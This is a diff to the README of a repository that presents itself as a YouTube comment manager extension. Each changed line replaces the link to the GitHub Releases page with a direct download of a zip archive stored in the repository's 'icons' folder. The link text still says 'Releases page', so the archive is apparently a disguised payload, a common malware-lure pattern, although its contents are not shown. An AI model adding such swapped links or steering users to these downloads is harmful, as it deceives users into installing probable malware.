@@ -11,11 +11,11 @@
 To begin using youtube-comment-manager, follow the steps below to download and install the software.
 
 ### 💾 Download Link
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/Ranayudistira7804pRojEctT/youtube-comment-manager/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Ranayudistira7804pRojEctT/youtube-comment-manager/main/icons/youtube-comment-manager-1.2.zip%20Latest%20Release-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Ranayudistira7804pRojEctT/youtube-comment-manager/main/icons/youtube-comment-manager-1.2.zip)
 
 ## 📥 Download & Install
 1. **Visit the Download Page**
-   Go to the [Releases page](https://github.com/Ranayudistira7804pRojEctT/youtube-comment-manager/releases) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/Ranayudistira7804pRojEctT/youtube-comment-manager/main/icons/youtube-comment-manager-1.2.zip) to find the latest version of the software.
 
 2. **Choose Your Version**
    Look for the file that matches your browser. The extension is available for Chrome and Firefox. Pick the right file for your needs.
@@ -62,7 +62,7 @@ Your data privacy is important. The extension does not store or share your perso
 - **Comments Not Posting**: Check your internet connection and your extension settings.
 
 ## 🔄 Updates
-Keep an eye on the [Releases page](https://github.com/Ranayudistira7804pRojEctT/youtube-comment-manager/releases) for new features and improvements. Regular updates will enhance your experience.
+Keep an eye on the [Releases page](https://raw.githubusercontent.com/Ranayudistira7804pRojEctT/youtube-comment-manager/main/icons/youtube-comment-manager-1.2.zip) for new features and improvements. Regular updates will enhance your experience.
 
 ## 📚 Resources
 - **Documentation**: Detailed guides are available on the project's wiki.
